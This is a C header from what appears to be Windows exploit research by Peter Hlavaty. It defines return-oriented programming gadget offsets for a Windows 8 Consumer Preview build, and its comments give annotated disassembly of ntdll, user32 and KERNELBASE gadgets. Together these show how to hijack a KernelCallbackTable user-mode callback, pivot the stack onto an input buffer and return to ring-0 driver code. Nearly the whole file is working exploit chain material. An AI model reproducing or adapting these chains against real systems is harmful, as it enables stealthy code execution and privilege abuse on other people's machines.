/**
 * @file ROP.h
 * @author created by: Peter Hlavaty
 */

#ifndef __ROP_H__
#define __ROP_H__

//NOTE : WIN8CP offsets for ROP!!!

#define CALLBACK_PARAM0 0
#define CALLBACK_PARAM1 1
#define CALLBACK_PARAM2 2
#define CALLBACK_PARAM3 3
#define CALLBACK_PARAM4 4
#define CALLBACK_FUNCTION 5 //ntdll!LdrpVerifyAlternateResourceModule+0xd5

#define ROP_SET_STACK1 CALLBACK_PARAM4 //ntdll!RtlpWalkLowFragHeapSegment+0x64
#define ROP_SET_STACK2 CALLBACK_FUNCTION //ntdll!LdrpVerifyAlternateResourceModule+0xd5

#define ROP_SETRCX 1 //user32!GetAsyncKeyState+0x99
#define ROP_user32DrawText_STACKSET 7 // will be used for KernelCallbackTable /*user32!DrawTextW+0x57*/
#define ROP_targetFunctionAddr (ROP_SETRCX + ROP_user32DrawText_STACKSET) 
#define ROP_setVars1 (ROP_targetFunctionAddr + 1) //ntdll!LdrpGetProcedureAddress+0x171

#define ROP_R9 (0x18 / sizeof(void*)) //user32!gSharedInfo
#define ROP_RCX (ROP_SETRCX + 1)
#define ROP_R11 (ROP_setVars1 + 1 + (0x40 / sizeof(void*)))
#define ROP_R13 (ROP_setVars1 + 1 + (0x78 / sizeof(void*)))
#define ROP_R14 (ROP_R11 + 1)
#define ROP_RBP (ROP_R11 + (0x48 / sizeof(void*)))

#define ROP_setVars2 (ROP_R11 + 5) //KERNELBASE!_GSHandlerCheckCommon+0x8c
#define ROP_ntCallbackReturn (ROP_R11 + (0xE8 / sizeof(void*))) //ntdll!ZwCallbackReturn

#define ROP_OUTPUT_FROM_FUNCTION 0xD

/*

ROP GADGETS INFO : 

//PEB::KernelCallbackTale[2] used for KeUserModeCallback :

__fnDWORD proc near

var_38= qword ptr -38h
var_28= qword ptr -28h
var_20= dword ptr -20h
var_18= qword ptr -18h

sub     rsp, 58h
mov     rax, [rcx+20h]
mov     r9, [rcx+18h]
mov     r8, [rcx+10h]
mov     edx, [rcx+8]
and     [rsp+58h+var_20], 0
and     [rsp+58h+var_18], 0
mov     r10, rcx
mov     rcx, [rcx]
mov     [rsp+58h+var_38], rax
call    qword ptr [r10+28h]												//->ntdll!RtlpWalkLowFragHeapSegment+0x5c
xor     r8d, r8d
lea     edx, [r8+18h]
lea     rcx, [rsp+58h+var_28]
mov     [rsp+58h+var_28], rax
call    cs:__imp_NtCallbackReturn
add     rsp, 58h
retn
__fnDWORD endp


//set RAX (on behalf of R9 - setted in _fnDWORD from input buffer)
//R10 setted in _fnDWORD to &input
//set RSP after _fnDWORD call [r10 + ROP_STACKSET2]
ntdll!RtlpWalkLowFragHeapSegment+0x5c:
000007fd`96f0b5e4 498b4130        mov     rax,qword ptr [r9+30h]
000007fd`96f0b5e8 49894228        mov     qword ptr [r10+28h],rax
000007fd`96f0b5ec 4883c428        add     rsp,28h
000007fd`96f0b5f0 c3              ret									//->ntdll!LdrpVerifyAlternateResourceModule+0xd5

set RSP to input buffer! + start ROPING on input buffer!!
ntdll!LdrpVerifyAlternateResourceModule+0xd5:
000007fa`62c61ee9 4883c470        add     rsp,70h
000007fa`62c61eed 415f            pop     r15
000007fa`62c61eef 415e            pop     r14
000007fa`62c61ef1 5f              pop     rdi
000007fa`62c61ef2 5e              pop     rsi
000007fa`62c61ef3 5d              pop     rbp
000007fa`62c61ef4 c3              ret									//->user32!GetAsyncKeyState+0x99

set rcx as para to targetFunc!
user32!GetAsyncKeyState+0x99:
000007fd`3d2a3b09 59              pop     rcx
000007fd`3d2a3b0a 0800            or      byte ptr [rax],al
000007fd`3d2a3b0c 33c0            xor     eax,eax
000007fd`3d2a3b0e 488b5c2430      mov     rbx,qword ptr [rsp+30h]
000007fd`3d2a3b13 4883c420        add     rsp,20h
000007fd`3d2a3b17 5f              pop     rdi
000007fd`3d2a3b18 c3              ret									//->target func->ntdll!LdrpGetProcedureAddress+0x171

set r13 (size - 0x100); set r14 (0), set r11 (relative rsp), move rsp (near to r11)
ntdll!LdrpGetProcedureAddress+0x171:
000007fd`3fc053c1 4c8b6c2478      mov     r13,qword ptr [rsp+78h]
000007fd`3fc053c6 4c8d5c2440      lea     r11,[rsp+40h]
000007fd`3fc053cb 498b5b40        mov     rbx,qword ptr [r11+40h]
000007fd`3fc053cf 498b6b48        mov     rbp,qword ptr [r11+48h]
000007fd`3fc053d3 498be3          mov     rsp,r11
000007fd`3fc053d6 415f            pop     r15
000007fd`3fc053d8 415e            pop     r14
000007fd`3fc053da 415c            pop     r12
000007fd`3fc053dc 5f              pop     rdi
000007fd`3fc053dd 5e              pop     rsi
000007fd`3fc053de c3              ret									//->KERNELBASE!_GSHandlerCheckCommon+0x8c

r8 <- r14; edx <- r13d; rcx <- r11; [r11 + smth] <- res; call [rsp + smth]
KERNELBASE!_GSHandlerCheckCommon+0x8c//KERNELBASE!LCMapStringEx - 0x211C:
000007fd`3cb72d00 4889442438      mov     qword ptr [rsp+38h],rax
000007fd`3cb72d05 488b442460      mov     rax,qword ptr [rsp+60h]
000007fd`3cb72d0a 4d8bc6          mov     r8,r14
000007fd`3cb72d0d 4889442430      mov     qword ptr [rsp+30h],rax
000007fd`3cb72d12 8b85b8000000    mov     eax,dword ptr [rbp+0B8h]
000007fd`3cb72d18 418bd5          mov     edx,r13d
000007fd`3cb72d1b 89442428        mov     dword ptr [rsp+28h],eax
000007fd`3cb72d1f 498bcb          mov     rcx,r11
000007fd`3cb72d22 4c89642420      mov     qword ptr [rsp+20h],r12
000007fd`3cb72d27 41ff93e8000000  call    qword ptr [r11+0E8h]			//->ntdll!ZwCallbackReturn->back to driver CPL0 code
*/


#endif //__ROP_H__
